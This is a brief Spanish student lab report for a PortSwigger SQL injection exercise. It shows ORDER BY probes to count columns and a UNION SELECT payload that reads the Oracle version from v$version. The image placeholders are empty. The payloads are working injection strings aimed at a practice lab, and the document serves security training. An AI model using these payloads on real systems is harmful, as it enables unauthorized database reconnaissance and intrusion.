# README_CHRISTIAN_SANGUCHO_DIAZ
# INFORME LABORATORIO https://portswigger.net/

## Laboratorio:
Ataque de inyección SQL, consultando el tipo y la versión de la base de datos en Oracle

## Objetivo:
Conseguir la versión de Oracle

##Consulta Original: 
SELECT * FROM articles WHERE category = ‘Gifts’


## Consulta Manipulada:
Se busca el número de columnas con las siguientes instrucciones
‘ ORDER BY 1
‘ ORDER BY 2
‘ ORDER BY 3


! [Imagen búsqueda de número de columnas con error]()
! [Imagen búsqueda de número de columnas]()

## Consulta para obtener la versión de Oracle
=Gifts' UNION SELECT banner, 'NULL' FROM v$version--
! [Imagen de la Version Oracle]
